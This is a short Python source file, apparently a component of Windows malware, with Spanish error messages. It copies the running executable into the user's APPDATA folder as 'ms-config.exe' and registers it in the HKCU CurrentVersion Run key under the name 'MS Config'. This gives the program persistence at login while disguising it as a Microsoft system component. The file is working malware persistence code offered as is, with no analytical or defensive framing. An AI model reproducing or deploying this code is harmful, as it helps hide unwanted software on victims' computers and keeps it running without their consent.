from os import getenv, path
from shutil import copyfile
from sys import executable
from winreg import (
    CloseKey,
    OpenKey,
    SetValueEx,
    HKEY_CURRENT_USER,
    KEY_SET_VALUE,
    REG_SZ,
)


def copy_to_roaming():
    roaming_path = getenv("APPDATA")
    new_path = path.join(roaming_path, "ms-config.exe")

    if not path.exists(new_path):
        try:
            copyfile(executable, new_path)
        except Exception as e:
            print(f"Error copiando a roaming: {e}")
    return new_path


def add_to_registry(exe_path):
    reg_key = HKEY_CURRENT_USER
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    name = "MS Config"

    try:
        key = OpenKey(reg_key, reg_path, 0, KEY_SET_VALUE)
        SetValueEx(key, name, 0, REG_SZ, exe_path)
        CloseKey(key)
    except Exception as e:
        print(f"Error agregando a registro: {e}")
